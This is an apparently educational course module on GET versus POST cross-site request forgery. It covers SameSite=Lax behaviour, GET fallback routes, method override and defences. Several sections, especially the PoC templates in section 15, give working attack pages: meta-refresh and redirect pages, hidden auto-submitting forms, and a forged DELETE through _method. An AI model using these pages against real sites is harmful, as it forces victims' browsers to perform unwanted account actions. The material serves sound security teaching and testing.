# CSRF Module 04 — GET vs POST CSRF
> **Curriculum:** CSRF Mastery for Ethical Hacking & Bug Bounty  
> **Module:** 04 of 12  
> **Topic:** HTTP Method Semantics, GET vs POST Exploitability, Method Override, Defense-in-Depth  
> **Level:** Intermediate — builds on Module 02 SameSite mechanics and Module 03 attack construction

---

## Table of Contents
- [CSRF Module 04 — GET vs POST CSRF](#csrf-module-04--get-vs-post-csrf)
  - [Table of Contents](#table-of-contents)
  - [1. HTTP Method Semantics — The Standard](#1-http-method-semantics--the-standard)
    - [Method Properties Table](#method-properties-table)
    - [Definitions](#definitions)
    - [Security Consequence of Violations](#security-consequence-of-violations)
  - [2. Why Method Alone Does Not Determine CSRF Risk](#2-why-method-alone-does-not-determine-csrf-risk)
    - [The Developer's Common Mistake](#the-developers-common-mistake)
    - [Method vs Mechanism](#method-vs-mechanism)
  - [3. GET-Based CSRF — Full Attack Anatomy](#3-get-based-csrf--full-attack-anatomy)
    - [Why GET is the Higher-Risk Method](#why-get-is-the-higher-risk-method)
    - [Complete Attack Example](#complete-attack-example)
  - [4. Which GET Vectors Send SameSite=Lax Cookies](#4-which-get-vectors-send-samesitelax-cookies)
    - [PoC Selection Logic](#poc-selection-logic)
  - [5. POST-Based CSRF — The Form Mechanism](#5-post-based-csrf--the-form-mechanism)
    - [Why HTML Forms Can Forge POST Requests](#why-html-forms-can-forge-post-requests)
    - [Request Produced](#request-produced)
  - [6. Why SameSite=Lax Blocks POST But Not GET](#6-why-samesitelax-blocks-post-but-not-get)
    - [Why the Asymmetry Was Intentional](#why-the-asymmetry-was-intentional)
    - [The Security Consequence](#the-security-consequence)
  - [7. The GET Fallback Problem](#7-the-get-fallback-problem)
    - [The Double-Route Test](#the-double-route-test)
    - [The Correct Fix](#the-correct-fix)
  - [8. Method Override — Hidden Attack Surface](#8-method-override--hidden-attack-surface)
    - [Common Method Override Mechanisms](#common-method-override-mechanisms)
    - [CSRF Implication](#csrf-implication)
    - [Frameworks That Support Method Override](#frameworks-that-support-method-override)
    - [Method Override Testing Procedure](#method-override-testing-procedure)
  - [9. The Lax+POST Timing Window — Residual Risk](#9-the-laxpost-timing-window--residual-risk)
    - [When This Matters](#when-this-matters)
    - [The Fix](#the-fix)
  - [10. CSRF Risk Matrix by Method and Cookie](#10-csrf-risk-matrix-by-method-and-cookie)
  - [11. Non-Browser Dangers of State-Changing GETs](#11-non-browser-dangers-of-state-changing-gets)
    - [Crawler/Bot Execution](#crawlerbot-execution)
    - [Browser Prefetching](#browser-prefetching)
    - [Proxy and CDN Caching](#proxy-and-cdn-caching)
    - [Browser History and Referer Leakage](#browser-history-and-referer-leakage)
  - [12. Defense-in-Depth — Why Single Controls Fail](#12-defense-in-depth--why-single-controls-fail)
  - [13. The Correct Fix for GET-Based CSRF](#13-the-correct-fix-for-get-based-csrf)
  - [14. Detection Methodology — Method-Focused](#14-detection-methodology--method-focused)
  - [15. PoC Templates by Method](#15-poc-templates-by-method)
    - [GET CSRF — Zero Interaction (Meta Refresh)](#get-csrf--zero-interaction-meta-refresh)
    - [GET CSRF — Zero Interaction (JS Redirect)](#get-csrf--zero-interaction-js-redirect)
    - [POST CSRF — Zero Interaction (Auto-Submit Form)](#post-csrf--zero-interaction-auto-submit-form)
    - [DELETE via Method Override CSRF](#delete-via-method-override-csrf)
    - [Lax+POST Timing Window Attack](#laxpost-timing-window-attack)
  - [16. Key Terminology Reference](#16-key-terminology-reference)
  - [17. Common Misconceptions](#17-common-misconceptions)
    - [❌ "Switching from GET to POST fixes CSRF"](#-switching-from-get-to-post-fixes-csrf)
    - [❌ "SameSite=Lax makes POST CSRF impossible"](#-samesitelax-makes-post-csrf-impossible)
    - [❌ "GET requests can't be CSRF attacks because they're read-only"](#-get-requests-cant-be-csrf-attacks-because-theyre-read-only)
    - [❌ "Returning 405 for GET prevents CSRF"](#-returning-405-for-get-prevents-csrf)
    - [❌ "Method override is rarely used in modern apps"](#-method-override-is-rarely-used-in-modern-apps)
    - [❌ "img tags are good CSRF vectors for SameSite=Lax applications"](#-img-tags-are-good-csrf-vectors-for-samesitelax-applications)
    - [❌ "CSRF tokens are unnecessary if I use SameSite=Strict"](#-csrf-tokens-are-unnecessary-if-i-use-samesitestrict)
  - [18. Bug Bounty Reference](#18-bug-bounty-reference)
    - [Method-Specific Testing Priority](#method-specific-testing-priority)
    - [Report Notes for Method-Based Findings](#report-notes-for-method-based-findings)
  - [19. Module 4 Summary — What You Must Know Cold](#19-module-4-summary--what-you-must-know-cold)

---

## 1. HTTP Method Semantics — The Standard

HTTP defines method properties precisely (RFC 9110). Violations create exploitable surface across multiple attack classes.

### Method Properties Table

```
┌──────────┬───────┬─────────────┬─────────────────────────────────┐
│ Method   │ Safe  │ Idempotent  │ Intended Use                    │
├──────────┼───────┼─────────────┼─────────────────────────────────┤
│ GET      │  YES  │    YES      │ Retrieve resource (read-only)   │
│ HEAD     │  YES  │    YES      │ Retrieve headers only           │
│ OPTIONS  │  YES  │    YES      │ Query server capabilities       │
│ POST     │  NO   │    NO       │ Create resource / trigger action│
│ PUT      │  NO   │    YES      │ Replace resource entirely       │
│ DELETE   │  NO   │    YES      │ Remove resource                 │
│ PATCH    │  NO   │    NO       │ Partial update to resource      │
└──────────┴───────┴─────────────┴─────────────────────────────────┘
```

### Definitions

**Safe:** The method causes no observable side effects on the server. The client is requesting information only — no state change should occur.

```
Safe methods: GET, HEAD, OPTIONS
Violation:    GET /delete?id=42  ← causes side effect = unsafe GET
```

**Idempotent:** Multiple identical requests produce the same server state as a single request.

```
Idempotent: DELETE /user/42 (first call deletes, subsequent calls return 404 — same end state)
Not idempotent: POST /transfer?amount=100 (each call creates a new transfer)
```

### Security Consequence of Violations

Every system that handles HTTP makes decisions based on method semantics:

```
Systems that assume GET is safe:
  ├── Browsers: may prefetch <link rel="prefetch"> GET URLs
  ├── Search crawlers: Googlebot follows and requests GET links
  ├── Proxy/CDN caches: may cache GET responses
  ├── Browser back button: re-issues GET on navigation
  ├── Analytics tools: log full GET URLs including parameters
  └── Load balancers: may replay idempotent requests on failure

If GET causes state changes:
  → All of the above become unintended attack/trigger vectors
  → State changes execute without user intent
```

---

## 2. Why Method Alone Does Not Determine CSRF Risk

The core concept: **HTTP method determines the attack mechanism, not the attack possibility.**

```
METHOD → CHANGES HOW THE ATTACK IS CONSTRUCTED
METHOD → DOES NOT CHANGE WHETHER THE ATTACK IS POSSIBLE

What actually determines CSRF possibility:
  1. Is there an active session cookie? (condition 1)
  2. Will the browser attach it cross-site? (SameSite value — condition 2)
  3. Can the server distinguish forged from legitimate? (CSRF token — condition 3)
```

### The Developer's Common Mistake

```
Vulnerable thinking:
  "GET is dangerous, POST is safe → switch to POST"

Correct thinking:
  "Both GET and POST are forgeable via HTML
   The defense is intent verification (CSRF token), not method selection
   Method only affects which HTML element the attacker uses"
```

### Method vs Mechanism

```
GET endpoint attack:
  Mechanism: <img>, <a>, <meta refresh>, window.location
  Interaction required: None (meta refresh, window.location)
  SameSite=Lax protection: NO — Lax allows cross-site GET navigation

POST endpoint attack:
  Mechanism: auto-submitting <form>
  Interaction required: None (body onload)
  SameSite=Lax protection: YES — Lax blocks cross-site POST cookie
```

---

## 3. GET-Based CSRF — Full Attack Anatomy

### Why GET is the Higher-Risk Method

```
GET CSRF advantages for attacker:
  ✓ More trigger vectors available (img, script, link, meta, iframe, a href)
  ✓ SameSite=Lax explicitly allows cross-site GET navigation
  ✓ Most vectors require zero user interaction
  ✓ Can be embedded invisibly in any page (img tag, 1px image)
  ✓ Harder for victim to detect (no visible form submission)
```

### Complete Attack Example

Target: `GET /admin/promote?user_id=55&role=admin`
Cookie: `SameSite=Lax`
CSRF token: None

```html
<!DOCTYPE html>
<html>
<head>
  <!-- Option 1: Zero interaction — meta refresh top-level navigation -->
  <meta http-equiv="refresh"
        content="0; url=https://app.victim.com/admin/promote?user_id=55&role=admin">
</head>
<body>
  <!-- Option 2: Zero interaction — JS redirect -->
  <script>
    window.location.href =
      "https://app.victim.com/admin/promote?user_id=55&role=admin";
  </script>

  <!-- Option 3: Requires one click -->
  <a href="https://app.victim.com/admin/promote?user_id=55&role=admin">
    Claim your prize
  </a>
</body>
</html>
```

**Best PoC choice:** `<meta refresh>` — zero interaction, fires before JS runs, works even if JS is disabled.

---

## 4. Which GET Vectors Send SameSite=Lax Cookies

This is critical — not all GET vectors send Lax cookies. The distinction is top-level navigation vs subresource.

```
┌─────────────────────────────────┬───────────────┬──────────────────┐
│ Vector                          │ Request Type  │ Lax Cookie Sent? │
├─────────────────────────────────┼───────────────┼──────────────────┤
│ <a href="..."> click            │ Top-level nav │ ✅ YES           │
│ <meta http-equiv="refresh">     │ Top-level nav │ ✅ YES           │
│ window.location.href = "..."    │ Top-level nav │ ✅ YES           │
│ window.location.replace("...")  │ Top-level nav │ ✅ YES           │
│ GET <form> submission           │ Top-level nav │ ✅ YES           │
│ HTTP 301/302/303 redirect (GET) │ Top-level nav │ ✅ YES           │
│ Browser address bar             │ Top-level nav │ ✅ YES           │
├─────────────────────────────────┼───────────────┼──────────────────┤
│ <img src="...">                 │ Subresource   │ ❌ NO            │
│ <iframe src="...">              │ Subresource   │ ❌ NO            │
│ <script src="...">              │ Subresource   │ ❌ NO            │
│ <link rel="prefetch">           │ Subresource   │ ❌ NO            │
│ fetch() GET request             │ Not top-level │ ❌ NO            │
│ XMLHttpRequest GET              │ Not top-level │ ❌ NO            │
└─────────────────────────────────┴───────────────┴──────────────────┘
```

**Key rule:** `SameSite=Lax` cookies are sent on cross-site requests ONLY when:
1. The method is GET **AND**
2. The request is a top-level navigation (changes the browser URL bar)

Subresource GET requests (`<img>`, `<iframe>`) do NOT send Lax cookies.

### PoC Selection Logic

```
Target has SameSite=Lax + state-changing GET:
  → Use top-level navigation vector
  → Best: <meta refresh> (zero interaction, works without JS)
  → Alternative: window.location.href (zero interaction, requires JS enabled)
  → Avoid: <img src> — WILL NOT send Lax cookie
```

---

## 5. POST-Based CSRF — The Form Mechanism

### Why HTML Forms Can Forge POST Requests

HTML `<form method="POST">` produces a POST request that is:
- A simple CORS request (no preflight)
- Sent directly with browser-attached cookies
- Content-Type: `application/x-www-form-urlencoded` by default

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="https://app.victim.com/api/user/delete"
        method="POST"
        style="display:none">
    <input type="hidden" name="user_id" value="42">
  </form>
</body>
</html>
```

### Request Produced

```http
POST /api/user/delete HTTP/1.1
Host: app.victim.com
Cookie: session=abc123          ← attached by browser (if SameSite allows)
Content-Type: application/x-www-form-urlencoded
Origin: https://evil.com        ← browser sets this automatically

user_id=42
```

---

## 6. Why SameSite=Lax Blocks POST But Not GET

This asymmetry is the most important concept in this module.

```
SameSite=Lax DECISION TREE for cross-site requests:

Is this request a top-level navigation?
  ├── YES: Is the method GET?
  │         ├── YES → ✅ SEND cookie (Lax exception for usability)
  │         └── NO  → ❌ BLOCK cookie (POST navigation blocked)
  └── NO (subresource, fetch, XHR):
            → ❌ BLOCK cookie (all non-navigation cross-site blocked)
```

### Why the Asymmetry Was Intentional

The `Lax` exception for GET navigation exists for usability:
- Users clicking links from emails, search results, social media should arrive logged in
- Blocking GET navigation cookies would break the web for most users
- POST is excluded because legitimate cross-site POST navigation is rare and can use other mechanisms

### The Security Consequence

```
GET + SameSite=Lax = CSRF VULNERABLE (navigation exception applies)
POST + SameSite=Lax = CSRF PROTECTED (no exception for POST)

But:
GET + SameSite=Lax + no state changes = SAFE (nothing to CSRF)
POST + SameSite=None = CSRF VULNERABLE (Lax protection removed)
POST + SameSite=Lax + no CSRF token = FRAGILE (one config change = vulnerable)
```

---

## 7. The GET Fallback Problem

When developers "fix" a GET-based CSRF by adding a POST route, they often leave the GET route active. This makes the fix ineffective.

```
"Fixed" application:
  GET  /api/user/delete?user_id=42   ← still responds 200 OK
  POST /api/user/delete               ← "the secure version"

Attacker response:
  Ignores POST endpoint entirely
  Uses GET endpoint: <meta refresh content="0; url=.../delete?user_id=42">
  SameSite=Lax cookie is sent (top-level GET navigation)
  Delete executes

Result: Fix accomplished nothing
```

### The Double-Route Test

When testing, always check if a POST endpoint also accepts GET:

```
Test 1: Send GET to POST endpoint URL
  GET /api/user/delete?user_id=42
  → 200 OK = GET fallback exists = Lax protection bypassed

Test 2: Send GET with same parameters in query string
  GET /api/transfer?to=bob&amount=100
  → 200 OK = exploitable via top-level navigation

Test 3: Check if handler is method-agnostic
  Some frameworks route both GET and POST to same controller action
  → Both methods trigger same behavior
```

### The Correct Fix

```
❌ Wrong:  Add POST route, leave GET route active
❌ Wrong:  Only add POST route without CSRF token
✅ Correct:
  1. Remove or restrict GET route (return 405 Method Not Allowed)
  2. Add CSRF token validation to POST route
  3. Verify no method override mechanisms are active
  4. Verify SameSite=Lax or Strict is explicitly set on session cookie
```

---

## 8. Method Override — Hidden Attack Surface

Some frameworks support method override, allowing POST requests to be treated as PUT, DELETE, or PATCH. This was introduced to support REST methods from HTML forms (which only support GET and POST).

### Common Method Override Mechanisms

```http
# Header-based override
POST /api/user/42 HTTP/1.1
X-HTTP-Method-Override: DELETE

# Query parameter override
POST /api/user/42?_method=DELETE HTTP/1.1

# Body parameter override
POST /api/user/42 HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=DELETE&user_id=42
```

### CSRF Implication

Method override lets an attacker forge DELETE, PUT, or PATCH requests via a simple POST form — bypassing any method-based restrictions:

```html
<!-- Forging a DELETE via POST form + method override -->
<body onload="document.forms[0].submit()">
  <form action="https://app.victim.com/api/user/42?_method=DELETE"
        method="POST"
        style="display:none">
    <input type="hidden" name="_method" value="DELETE">
  </form>
</body>
```

### Frameworks That Support Method Override

```
Ruby on Rails:    params[:_method] or _method body param
Laravel (PHP):    _method body parameter or X-HTTP-Method-Override header
Express (Node):   method-override middleware (X-HTTP-Method-Override header)
Django:           Not supported by default
Spring Boot:      HiddenHttpMethodFilter (disabled by default since Spring 5.3)
```

### Method Override Testing Procedure

```
For every state-changing endpoint (PUT, DELETE, PATCH):

Test 1: POST + X-HTTP-Method-Override: [TARGET_METHOD] header
Test 2: POST + ?_method=[TARGET_METHOD] query parameter
Test 3: POST + _method=[TARGET_METHOD] body parameter
Test 4: Try header variants:
        X-HTTP-Method-Override
        X-Method-Override
        X-HTTP-Method
        _method

If server responds to override:
  → Framework supports method override
  → Build CSRF PoC using POST form + override parameter
  → Method-based restrictions are bypassable
```

---

## 9. The Lax+POST Timing Window — Residual Risk

Chrome's Lax+POST compatibility mode applies to cookies **without an explicit SameSite attribute**.

```
Cookie without explicit SameSite in Chrome:

  t=0 (cookie set on login):
    Behavior: SameSite=None equivalent for top-level cross-site POST
    Duration: First 2 minutes after cookie creation
    Risk:     POST CSRF works within this window

  t=2min (window expires):
    Behavior: SameSite=Lax enforcement begins
    Risk:     POST CSRF blocked

Attack scenario:
  1. Force victim to log in (Login CSRF — Module 5)
  2. Immediately trigger forged POST action
  3. Cookie is still in 2-minute window
  4. POST carries the session cookie
  5. Action executes despite Lax default
```

### When This Matters

```
Affected: Cookies without explicit SameSite attribute (relying on browser default)
Unaffected: Cookies with explicit SameSite=Lax (no timing window applies)

Testing:
  Check Set-Cookie header for explicit SameSite attribute
  If absent: timing window is active
  Test POST CSRF immediately after login
```

### The Fix

```
Always set SameSite explicitly:
  Set-Cookie: session=abc123; SameSite=Lax; HttpOnly; Secure

Never rely on browser defaults:
  Defaults can change between browser versions
  Explicit configuration is always more reliable
```

---

## 10. CSRF Risk Matrix by Method and Cookie

```
┌──────────────────┬──────────────┬───────────────────────────────────────────┐
│ Endpoint Method  │ SameSite     │ CSRF Risk                                 │
├──────────────────┼──────────────┼───────────────────────────────────────────┤
│ GET (state chg)  │ None/Absent  │ CRITICAL — all GET vectors work           │
│ GET (state chg)  │ Lax          │ HIGH — top-level navigation vectors work  │
│ GET (state chg)  │ Strict       │ LOW — cross-site GET navigation blocked   │
│ GET (read only)  │ Any          │ NONE — CSRF is blind, no data exfiltration│
├──────────────────┼──────────────┼───────────────────────────────────────────┤
│ POST (no token)  │ None/Absent  │ CRITICAL — form CSRF fully works          │
│ POST (no token)  │ Lax          │ LOW* — blocked by Lax; timing window risk │
│ POST (no token)  │ Strict       │ VERY LOW — fully blocked cross-site       │
│ POST + CSRF tkn  │ Any          │ VERY LOW — token validates intent         │
├──────────────────┼──────────────┼───────────────────────────────────────────┤
│ PUT/DELETE/PATCH │ Any          │ LOW via direct — check method override    │
│ + method override│ Lax          │ MEDIUM — POST form + override param works │
└──────────────────┴──────────────┴───────────────────────────────────────────┘
* Lax+POST timing window is residual risk for cookies without explicit SameSite
```

---

## 11. Non-Browser Dangers of State-Changing GETs

CSRF is not the only threat from state-changing GET requests. Every system that assumes GET is safe becomes an unintended trigger.

### Crawler/Bot Execution

```
Scenario: Admin panel has GET /admin/delete-user?id=42
Googlebot discovers the URL (via sitemap, internal link, or crawl)
Googlebot fetches GET URLs to index content
→ User deleted by search crawler
→ No attacker required
```

### Browser Prefetching

```html
<!-- Developer adds prefetch hint for performance -->
<link rel="prefetch" href="/api/export?format=csv">

<!-- Browser fetches this URL in background "helpfully" -->
<!-- If URL causes state change → action executes without user intent -->
```

### Proxy and CDN Caching

```
GET /transfer?amount=100&to=bob

CDN assumes GET is cacheable (RFC says GET can be cached)
CDN caches the response
Subsequent requests served from cache
→ User sees "success" even when transfer doesn't re-execute
→ Or worse: CDN re-executes the cached request on refresh
```

### Browser History and Referer Leakage

```
User completes: GET /transfer?amount=100&to=bob&account=12345678
Full URL stored in:
  ├── Browser history (visible to anyone with device access)
  ├── Browser autocomplete (leaks to typed URL suggestions)
  ├── Referer header (sent to next page the user visits)
  └── Server/proxy access logs (sensitive data in plain URL)
```

---

## 12. Defense-in-Depth — Why Single Controls Fail

Relying on a single CSRF control creates a fragile security posture.

```
Single control failure scenarios:

SameSite=Lax only (no CSRF token):
  ├── Ops deploys without SameSite → full CSRF exposure
  ├── Old browser ignores SameSite → full CSRF exposure
  ├── Lax+POST timing window → POST CSRF within 2 min of login
  ├── GET fallback exists → Lax protection bypassed
  └── Framework update changes cookie defaults → exposure

CSRF token only (no SameSite):
  ├── XSS vulnerability exists → token extracted → CSRF succeeds
  ├── Token not tied to session → cross-user token works
  ├── Token not validated → server accepts any value
  └── Token leaked in Referer (if in URL) → exposure

Defense-in-depth model:
  Layer 1: SameSite=Lax or Strict → browser-level cookie control
  Layer 2: CSRF token → application-level intent verification
  Layer 3: Origin header validation → server-side source check
  Layer 4: Re-auth for critical actions → eliminates active session risk

If Layer 1 fails → Layer 2 still protects
If Layer 2 bypassed (XSS) → Layer 3 may still catch it
If Layer 3 absent → Layer 2 is primary defense
```

---

## 13. The Correct Fix for GET-Based CSRF

```
STEP 1: Remove the GET route
  Return 405 Method Not Allowed for GET requests to state-changing endpoints
  Verify no framework-level GET fallback exists

STEP 2: Implement POST with CSRF token
  Move action to POST endpoint
  Add CSRF token validation (synchronizer token pattern)
  Validate token server-side on every request

STEP 3: Set explicit SameSite attribute
  Set-Cookie: session=abc123; SameSite=Lax; HttpOnly; Secure
  Do not rely on browser defaults

STEP 4: Validate Origin header
  Reject requests where Origin header is present and not allowlisted
  Defense-in-depth layer

STEP 5: Disable method override
  Remove or disable X-HTTP-Method-Override support if not needed
  Ensure DELETE/PUT/PATCH cannot be triggered via POST form + override

STEP 6: Verify no GET equivalent exists
  Test all parameter combinations
  Test method override mechanisms
  Test if POST handler also responds to GET
```

---

## 14. Detection Methodology — Method-Focused

```
WHEN YOU FIND A STATE-CHANGING ENDPOINT:

1. Note the HTTP method
   GET → highest priority; immediately check SameSite and test all vectors
   POST → check SameSite, CSRF token, and test GET fallback

2. Test GET fallback for every POST endpoint
   Send: GET /same/path?same=params
   200 OK → GET fallback exists → exploitable via Lax navigation

3. Test method override
   Send POST + X-HTTP-Method-Override: GET/DELETE/PUT
   Send POST + ?_method=DELETE
   Send POST + body _method=DELETE
   Different response → override active → test CSRF via POST form + override

4. Check SameSite value
   SameSite=None or absent → all methods vulnerable
   SameSite=Lax → GET state changes vulnerable; check timing window for POST
   SameSite=Strict → very limited surface

5. Check for CSRF token
   Present: run bypass suite (Module 3, Section 13)
   Absent: build PoC for appropriate method

6. Select optimal attack vector
   GET + Lax: use <meta refresh> or window.location (zero interaction)
   POST + None/absent: use auto-submit form
   POST + Lax + timing window: force login then immediate POST

7. Verify interaction level
   Zero interaction: meta refresh, window.location, img (for None cookies)
   One click: <a href>
   Document which level your PoC requires
```

---

## 15. PoC Templates by Method

### GET CSRF — Zero Interaction (Meta Refresh)

```html
<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <meta http-equiv="refresh"
        content="0; url=https://TARGET.com/ENDPOINT?PARAM=VALUE">
</head>
<body>
  <p>Please wait...</p>
</body>
</html>
```

### GET CSRF — Zero Interaction (JS Redirect)

```html
<!DOCTYPE html>
<html>
<body>
<script>
  window.location.replace(
    "https://TARGET.com/ENDPOINT?PARAM=VALUE"
  );
</script>
</body>
</html>
```

### POST CSRF — Zero Interaction (Auto-Submit Form)

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="https://TARGET.com/ENDPOINT"
        method="POST"
        style="display:none">
    <input type="hidden" name="PARAM1" value="VALUE1">
    <input type="hidden" name="PARAM2" value="VALUE2">
  </form>
  <p>Please wait...</p>
</body>
</html>
```

### DELETE via Method Override CSRF

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="https://TARGET.com/api/resource/42?_method=DELETE"
        method="POST"
        style="display:none">
    <input type="hidden" name="_method" value="DELETE">
    <input type="hidden" name="confirm" value="true">
  </form>
</body>
</html>
```

### Lax+POST Timing Window Attack

```html
<!DOCTYPE html>
<html>
<body>
<script>
  // Step 1: Force victim to log in (Login CSRF — Module 5)
  // Step 2: Immediately submit forged POST within 2-minute window

  // After login redirect completes:
  setTimeout(function() {
    document.forms[0].submit();
  }, 500); // Small delay to ensure login cookie is set
</script>
  <form action="https://TARGET.com/SENSITIVE_ENDPOINT"
        method="POST"
        style="display:none">
    <input type="hidden" name="param" value="attacker_value">
  </form>
</body>
</html>
```

---

## 16. Key Terminology Reference

| Term | Definition |
|------|------------|
| **Safe method** | HTTP method that must not cause server-side state changes (GET, HEAD, OPTIONS) |
| **Idempotent method** | HTTP method where repeated identical requests produce same result (GET, PUT, DELETE) |
| **State-changing GET** | GET request that modifies server state — violates HTTP semantics and enables CSRF |
| **Top-level navigation** | Request that changes the browser URL bar; Lax cookie exception applies |
| **Subresource request** | Request for embedded content (img, script, iframe); Lax cookies NOT sent |
| **GET fallback** | When a POST endpoint also accepts GET requests — bypasses POST CSRF protections |
| **Method override** | Framework feature allowing POST to simulate PUT/DELETE via header or parameter |
| **X-HTTP-Method-Override** | Common header used for method override in REST frameworks |
| **_method parameter** | Common body/query parameter used for method override (Rails, Laravel) |
| **Lax+POST window** | 2-minute Chrome window where cookies without explicit SameSite behave like None for POST |
| **Defense-in-depth** | Using multiple independent security controls so failure of one doesn't expose the system |
| **405 Method Not Allowed** | Correct HTTP response for method-restricted endpoints |
| **RFC 9110** | HTTP semantics specification defining safe and idempotent method properties |

---

## 17. Common Misconceptions

### ❌ "Switching from GET to POST fixes CSRF"
**Wrong.** POST is forgeable via auto-submitting HTML forms. Method change alters the attack mechanism, not the possibility. A CSRF token is the fix, not a method change.

### ❌ "SameSite=Lax makes POST CSRF impossible"
**Wrong.** Lax blocks cross-site POST cookies under normal conditions, but the Lax+POST timing window (2 minutes after login for cookies without explicit SameSite) is a live bypass. Defense-in-depth requires a CSRF token regardless.

### ❌ "GET requests can't be CSRF attacks because they're read-only"
**Wrong on two counts.** GET requests are supposed to be read-only, but applications frequently violate this. When they do, GET-based CSRF is the highest-risk variant because it has the most attack vectors and Lax cookies are explicitly sent on cross-site GET navigation.

### ❌ "Returning 405 for GET prevents CSRF"
**Partially right.** 405 for GET + CSRF token on POST = good. But 405 for GET alone leaves POST vulnerable if SameSite is ever misconfigured, and method override may still allow GET-equivalent behavior.

### ❌ "Method override is rarely used in modern apps"
**Wrong.** Rails, Laravel, and older Express applications commonly use method override. Always test for it. A 405 response to DELETE might still execute via POST + _method=DELETE.

### ❌ "img tags are good CSRF vectors for SameSite=Lax applications"
**Wrong.** `<img src>` triggers a subresource request, not a top-level navigation. SameSite=Lax cookies are NOT sent on subresource requests. Use `<meta refresh>` or `window.location` instead for GET-based CSRF on Lax-protected applications.

### ❌ "CSRF tokens are unnecessary if I use SameSite=Strict"
**Risky.** SameSite=Strict provides strong protection but is a single control. XSS on the same site can still forge authenticated requests since same-site requests always carry cookies. Defense-in-depth (Strict + CSRF token) is always preferable.

---

## 18. Bug Bounty Reference

### Method-Specific Testing Priority

```
Priority 1 — GET state-changing endpoints (highest risk)
  Find:    GET /action?param=value that modifies server state
  Check:   SameSite value; if Lax → immediately exploitable via navigation
  PoC:     <meta refresh> or window.location (zero interaction)
  Report:  Critical/High depending on action

Priority 2 — POST endpoints without CSRF tokens
  Find:    POST /action without csrf_token in body or header
  Check:   SameSite value; if None or absent → immediately exploitable
  Check:   GET fallback exists?
  PoC:     Auto-submit form; or meta refresh if GET fallback exists
  Report:  High/Critical depending on action

Priority 3 — Method override
  Find:    POST endpoints that accept X-HTTP-Method-Override or _method
  Check:   Can you trigger DELETE/PUT/PATCH via POST form?
  PoC:     POST form with _method=DELETE parameter
  Report:  Severity based on overridden method's action

Priority 4 — Lax+POST timing window
  Find:    POST endpoints; cookies without explicit SameSite attribute
  Check:   Set-Cookie header for SameSite attribute
  Attack:  Force login + immediate POST within 2 minutes
  Report:  Medium/High (requires timing; lower exploitability)
```

### Report Notes for Method-Based Findings

```
For GET-based CSRF:
  Note: "This endpoint performs a state-changing action via GET, violating
  HTTP safety semantics (RFC 9110). This enables zero-interaction CSRF
  via top-level navigation, bypassing SameSite=Lax cookie protection."

For method override:
  Note: "The application supports HTTP method override via [header/parameter],
  allowing a POST form to trigger [DELETE/PUT] actions. This bypasses
  method-based restrictions and enables CSRF via standard HTML form submission."

For GET fallback:
  Note: "Although the primary endpoint uses POST, the server also accepts
  GET requests to the same path. This GET route is exploitable via
  cross-site top-level navigation under SameSite=Lax."
```

---

## 19. Module 4 Summary — What You Must Know Cold

```
HTTP METHOD SEMANTICS:
✓ GET = safe + idempotent → must not cause state changes
✓ POST = not safe + not idempotent → appropriate for state changes
✓ Violating GET safety creates multiple unintended triggers beyond CSRF

METHOD AND CSRF RISK:
✓ Method determines attack mechanism, not attack possibility
✓ GET is higher risk: more trigger vectors, Lax exception applies
✓ POST is lower risk under Lax: blocked by cookie policy, not method itself
✓ Neither GET nor POST is inherently CSRF-safe — the session cookie and token matter

SAMESITE AND METHOD INTERACTION:
✓ SameSite=Lax ALLOWS cross-site cookies on GET top-level navigation
✓ SameSite=Lax BLOCKS cross-site cookies on POST requests
✓ Subresource GET requests (img, iframe) do NOT get Lax cookies
✓ Use meta refresh or window.location for GET CSRF under Lax (not img tag)

GET FALLBACK:
✓ Always test if POST endpoints also accept GET
✓ If GET fallback exists → Lax POST protection is completely bypassed
✓ Fixing POST without removing GET route = no fix

METHOD OVERRIDE:
✓ X-HTTP-Method-Override header or _method parameter
✓ Allows POST form to trigger DELETE/PUT/PATCH
✓ Active in Rails, Laravel, older Express apps
✓ Always test when state-changing PUT/DELETE/PATCH endpoints exist

TIMING WINDOW:
✓ Cookies without explicit SameSite: 2-min Chrome window where POST CSRF works
✓ Always set SameSite explicitly — never rely on browser defaults

DEFENSE-IN-DEPTH:
✓ SameSite alone = fragile (one config change = exposure)
✓ CSRF token alone = fragile (XSS can extract it)
✓ SameSite + CSRF token = robust layered defense
✓ Critical actions: add re-authentication as third layer
```

---

*Next: Module 05 — Multi-Step & Stateful Workflows*  
*CSRF across multiple steps, chaining partial actions, login CSRF,*
*what "confirmation" dialogs actually protect against, and TOCTOU-style issues*